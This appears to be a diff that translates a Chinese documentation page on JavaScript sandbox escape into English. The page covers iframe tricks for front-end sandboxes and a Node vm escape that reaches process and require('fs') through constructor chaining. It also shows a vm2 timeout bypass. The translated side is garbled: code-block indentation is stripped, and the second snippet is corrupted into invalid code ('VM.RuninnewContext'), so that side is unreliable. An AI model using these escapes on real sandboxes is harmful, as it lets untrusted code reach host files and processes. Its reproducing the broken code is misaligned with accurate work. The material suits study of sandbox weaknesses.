@@ -1,35 +1,35 @@
-沙箱逃逸
+Sandbox escape
 ========================================
 
-前端沙箱
+Front-end sandbox
 ----------------------------------------
-在前端中，可能会使用删除 ``eval`` ，重写 ``Function.prototype.constructor`` / ``GeneratorFunction`` / ``AsyncFunction`` 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。
+In the front-end, you may use deletion ``eval``, rewrite ``Function.prototype.constructor`` / ``GeneratorFunction`` / ``AsyncFunction`` and so on to complete the front-end sandboxing. In this case, you can use the way to create a new iframe to get a new execution environment.
 
-服务端沙箱
+Server side sandbox
 ----------------------------------------
-JavaScript提供了原生的vm模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的JavaScript API和全局的NodeJS环境。
+JavaScript provides native vm modules for isolating the code context environment. However, in this environment, the standard JavaScript API and the global NodeJS environment can still be accessed.
 
-在原生的沙箱模块中，常用的逃逸方式为：
+In the native sandbox module, the commonly used escape methods are:
 
 .. code-block:: javascript
 
-    const vm = require('vm');
-    const sandbox = {};
-    const whatIsThis = vm.runInNewContext(`
-        const ForeignObject = this.constructor;
-        const ForeignFunction = ForeignObject.constructor;
-        const process = ForeignFunction("return process")();
-        const require = process.mainModule.require;
-        require("fs");
-    `, sandbox);
+const vm = require('vm');
+const sandbox = {};
+const whatIsThis = vm.runInNewContext(`
+const ForeignObject = this.constructor;
+const ForeignFunction = ForeignObject.constructor;
+const process = ForeignFunction("return process")();
+const require = process.mainModule.require;
+require("fs");
+`, sandbox);
 
 
-考虑到JavaScript原生vm模块的缺陷，有开发者设计了vm2来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：
+Considering the shortcomings of JavaScript native vm module, some developers have designed vm2 to provide a safer isolation environment, but there are also some escape methods in the old version, such as:
 
 .. code-block:: javascript
 
-    vm.runInNewContext(
-      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
-      {console:{log(){console.log.apply(console,arguments);}}},
-      {timeout:5}
-    );
+VM.RuninnewContext (
+'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
+{console:{log(){console.log.apply(console,arguments);}}},
+{timeout:5}
+);
